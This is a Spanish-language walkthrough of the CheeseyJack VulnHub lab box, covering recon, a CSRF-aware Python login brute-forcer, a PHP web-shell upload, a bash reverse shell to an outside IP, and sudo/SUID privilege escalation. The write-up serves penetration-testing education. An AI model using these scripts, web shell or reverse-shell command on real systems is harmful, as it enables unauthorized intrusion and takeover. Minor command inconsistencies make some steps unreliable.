---
layout: single
title: Cheesey CheeseyJack - VulnHub
excerpt: " Cheeseyjack aims to be an easy to medium level real-world-like box. Everything on this box is designed to make sense, and possibly teach you something. Enumeration will be key when attacking this machine.
Hint: A cewl tool can help you get past a login page. "
date: 2023-01-26
classes: wide
header:
  teaser: /blog/assets/images/vh-writeup-cheesey/cheesey.png
  teaser_home_page: true
  icon: /blog/assets/images/vulnhub.webp
categories:
  - vulnhub
tags:
  - burpsuite
  - php
  - csrf
  - python
  - sudoer
---

Cheeseyjack aims to be an easy to medium level real-world-like box. Everything on this box is designed to make sense, and possibly teach you something. Enumeration will be key when attacking this machine.
Hint: A cewl tool can help you get past a login page.

# Summary
- IP: 192.168.0.112
- Ports: 22,80,111,139,445,2049,33060,43217,45135,50397,55855
- OS: Linux (Ubuntu Focal)
- Services & Applications:
	-  22 -> OpenSSH 8.2p1 Ubuntu 4ubuntu0.1
	-  80 -> Apache httpd 2.4.41
	-  11 -> 2-4 (RPC #100000)
	-  139 -> Samba smbd 4.6.2
	-  445 -> Samba smbd 4.6.2
	-  2049 -> 3 (RPC #100227)
	-  33060 -> mysqlx?
	-  43217 -> mountd      1-3 (RPC #100005)
	-  45135 -> nlockmgr    1-4 (RPC #100021)
	-  50397 -> mountd      1-3 (RPC #100005)
	-  55855 -> mountd      1-3 (RPC #100005)

# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.0.112 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p22,80,111,139,445,2049,33060,43217,45135,50397,55855 -sCV 192.168.0.112 -oN targeted
```

- Análisis de directorios con gobuster:

```bash
gobuster dir -u 192.168.0.112 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200

gobuster dir -u 192.168.0.112/project_management -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
```

- Análisis RPC (ya que está abierto el puerto 2049):

```bash
showmount -e 192.168.0.112
```

- Vemos un posible usuario "ch33s3m4n", montamos el directorio encontrado pero no encontramos nada interesante.

# Análisis de página web:

- Analizamos la página principal pero no encontramos nada que podamos explotar.

- Analizamos los directorios encontrados:

	- En "/it_security" encontramos un archivo de texto el cual revela que la contraseña del usuario "cheese" es muy fácil.

	- En "/project_management" encontramos un login de "qdpm".

- Probamos varios ataques de SQLI en el login, sin resultados.

- Nos pide "email" y "contraseña", vemos un posible dominio "cheeseyjack.local" por lo que un posible email válido podría ser el que encontramos anteriormente ```"ch33s3m4n@cheeseyjack.local"```

# Ataque CSRF Token para obtener contraseña de usuario:

- Usamos la información obtenida hasta ahora para hacer un ataque de fuerza bruta con un diccionario creado por nosotros mismos recopilando todas las palabras claves de las páginas a las que hemos tenido acceso hasta ahora:

```bash
$cewl http://192.168.0.112 -w passwords.txt

$cewl http://192.168.0.112/project_management >> passwords.txt

$cat passwords.txt | sort -u | sponge passwords.txt 

$cat passwords.txt | wc -l
```

- Interceptamos con Burpsuite la petición al intentar logear para obtener los datos emitidos como POST.

```html
login[_csrf_token]=ccfb459f3c07c6f5c12c553a3788693e&login[email]=che@hotmail.com&login[password]=asdsad&http_referer=http://192.168.0.112/project_management/
```

- Nos damos cuenta que aparte del email y el password, se emite un token el cual se genera de forma aleatoria al realizar la petición, con la ayuda de expresiones regulares (regex) nos creamos una script en python para automatizar el ataque de fuerza bruta, probando cada contraseña del diccionario creado y generando un token para cada petición:



```python
#!/usr/bin/python3

from pwn import *
import requests, sys, time, signal, pdb, re

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#Variable globales
login_url = "http://192.168.0.112/project_management/index.php/login"

def makeBruteForce():
	f = open("passwords.txt", "r")

	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando ataque de fuerza bruta")

	time.sleep(2)
	counter = 1
	
	for password in f.readlines():
		password = password.strip()	

		p1.status("Probando con la contraseña [%d/149]: %s" % (counter,password) )

		s = requests.session()
		
		r = s.get(login_url)
		
		token = re.findall(r'_csrf_token]" value="(.*?)"', r.text)[0]
		
		data_post = {
			'login[_csrf_token]': token,
			'login[email]': 'ch33s3m4n@cheeseyjack.local',
			'login[password]': password,
			'http_referer': 'http://192.168.0.112/project_management/'
		}
		r = s.post(login_url, data = data_post)

		if "No match" not in r.text:
			p1.success ("La contraseña es %s" %password)
			sys.exit(0)
		counter += 1
			
if __name__ == '__main__':
makeBruteForce()


```

- Ejecutando la script, obtenemos la credencial "qdpm", accedemos como ```"ch33s3m4n@cheeseyajck.local".```

- Analizamos el dashboard de qdpm; en la pestaña "Projects" y "add projects" se nos permite subir un proyecto y adjuntar un archivo en la parte de "attachments", subimos un archio PHP malicioso con código que  nos permita ejecutar comandos de forma remota (RCE) mediante el parámetro "cmd":

```php
<?php echo passthru($_GET['cmd']); ?>
```

- Accedemos al directorio "/uploads" encontrado anteriormente en la fase de reconocimiento y en la carpeta de "attachments" abrimos el archivo php creado.

```
http://192.168.0.112/project_management/uploads/attachments/465440-cmd.php?cmd=whoami
```


- Nos entablamos una reverse shell básica y ganamos acceso al sistema:

```
http://192.168.0.112/project_management/uploads/attachments/465440-cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.0.108/443 0>%261"
```



# ESCALANDO PRIVILEGIOS:

- Dentro de la carpeta "home" encontramos al usuario "crab", entramos y leemos el archio "todo.txt"

- El archivo nos dice sobre un backup de SSH el cual está alojado en el directorio "/var/backups"

- En ese directorio encontramos otro directorio llamado "/ssh-bak", entramos y encontramos una clave privada de SSH para poder acceder sin contraseña, lo hacemos:

- Creamos un archivo "key.txt" que contenga la SSH private key, le damos permiso de ejecución y accedemos via SSH como "crab":

```bash
chmod 600 key.txt

ssh -i key.txt crab@192.168.0.112
```

- Verificamos permisos de sudoers y encontramos lo siguiente:

```
(root) NOPASSWD: /home/crab/.bin/
```

- Es decir, podemos ejecutar cualquier binario de aquel directorio como "root" sin proporcionar contraseña, entonces, al tener permisos de escritura, dentro de ese directorio creamos un binario simple que otorgue permisos SUID a la bash:

```bash
nano pwned
```

```
chmod u+s /bin/bash
```

```bash
chmod +x bash
sudo /home/crab/.bin/bash
```

- Ahora ejecutamos la bash con los privilegios de root y ganamos acceso total a la máquina:

```bash
bash -p
```
